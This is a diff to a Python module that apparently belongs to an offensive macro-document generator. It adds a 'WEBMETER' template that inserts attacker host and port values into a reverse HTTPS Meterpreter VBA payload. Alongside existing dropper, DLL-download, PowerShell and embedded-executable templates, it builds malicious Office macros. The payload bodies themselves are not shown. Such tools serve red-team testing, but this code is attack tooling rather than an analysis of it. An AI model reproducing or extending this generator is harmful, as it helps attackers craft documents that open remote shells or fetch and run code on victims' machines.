@@ -7,7 +7,8 @@ import os
 import logging
 from modules.mp_module import MpModule
 import vbLib.Meterpreter
-from vbLib import templates
+import vbLib.WebMeter
+import vbLib.templates
 from common import  utils
 import base64
 from common.utils import MSTypes
@@ -187,7 +188,7 @@ class TemplateToVba(MpModule):
             chunksDecode += "\tchunk"+str(l)+" = var"+str(l)+"()\n"
             chunksDecode += "\tout1 = out1 + chunk"+str(l)+"\n"
 
-        content = templates.EMBED_EXE
+        content = vbLib.templates.EMBED_EXE
         content = content.replace("<<<STRINGS>>>", sub_proc)
         content = content.replace("<<<DECODE_CHUNKS>>>", chunksDecode)
         content = content.replace("<<<OUT_FILE>>>", outputPath)
@@ -217,13 +218,13 @@ class TemplateToVba(MpModule):
         dllFct = params[1]        
 
         # generate main module 
-        content = templates.DROPPER_DLL2
+        content = vbLib.templates.DROPPER_DLL2
         content = content.replace("<<<DLL_FUNCTION>>>", dllFct)
         invokerModule = self.addVBAModule(content)
         logging.info("   [-] Template %s VBA generated in %s" % (self.template, invokerModule)) 
         
         # second module
-        content = templates.DROPPER_DLL1
+        content = vbLib.templates.DROPPER_DLL1
         content = content.replace("<<<DLL_URL>>>", dllUrl)
         if MSTypes.XL in self.outputFileType:
             msApp = MSTypes.XL
@@ -255,7 +256,7 @@ class TemplateToVba(MpModule):
         params = shlex.split(valuesFileContent)# split on space but preserve what is between quotes
         rhost = params[0]
         rport = params[1] 
-        content = templates.METERPRETER
+        content = vbLib.templates.METERPRETER
         content = content.replace("<<<RHOST>>>", rhost)
         content = content.replace("<<<RPORT>>>", rport)
         if self.outputFileType in [MSTypes.HTA, MSTypes.VBS, MSTypes.SCT]:
@@ -265,27 +266,52 @@ class TemplateToVba(MpModule):
         vbaFile = self.addVBAModule(content)
         logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
         
+ 
+    def _processWebMeterTemplate(self):
+        """ Generate reverse https meterpreter template for VBA and VBS based  
         
-    
-    def run(self):
-        logging.info(" [+] Generating VBA document from template...")
+        """
+        # open file containing template values       
+        cmdFile = self.getCMDFile()
+        if cmdFile is None or cmdFile == "":
+            logging.error("   [!] Could not find template parameters!")
+            return
+        f = open(cmdFile, 'r')
+        valuesFileContent = f.read()
+        f.close()
+        params = shlex.split(valuesFileContent)# split on space but preserve what is between quotes
+        rhost = params[0]
+        rport = params[1] 
+        content = vbLib.templates.WEBMETER
+        content = content.replace("<<<RHOST>>>", rhost)
+        content = content.replace("<<<RPORT>>>", rport)
+        content = content + vbLib.WebMeter.VBA
+
+        vbaFile = self.addVBAModule(content)
+        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
+        
+ 
+    def _generation(self):
         if self.template is None:
             logging.info("   [!] No template defined")
             return
         
         if self.template == "HELLO":
-            content = templates.HELLO
+            content = vbLib.templates.HELLO
         elif self.template == "DROPPER":
-            content = templates.DROPPER
+            content = vbLib.templates.DROPPER
         elif self.template == "DROPPER2":
-            content = templates.DROPPER2
+            content = vbLib.templates.DROPPER2
         elif self.template == "DROPPER_PS":
-            content = templates.DROPPER_PS
+            content = vbLib.templates.DROPPER_PS
         elif self.template == "METERPRETER":
             self._processMeterpreterTemplate()
             return
+        if self.template == "WEBMETER":
+            self._processWebMeterTemplate()
+            return
         elif self.template == "CMD":
-            content = templates.CMD
+            content = vbLib.templates.CMD
         elif self.template == "EMBED_EXE":
             # More complexe template, not the usual treatment
             self._processEmbedExeTemplate()
@@ -313,4 +339,10 @@ class TemplateToVba(MpModule):
             os.remove(cmdFile)
             logging.info("   [-] OK!") 
         else:
-            logging.error("   [!] Could not find template input! Use \"-t help\" option for help on templates.")
+            logging.error("   [!] Could not find template input! Use \"-t help\" option for help on templates.")       
+    
+    def run(self):
+        logging.info(" [+] Generating VBA document from template...")
+        self._generation()
+        
+
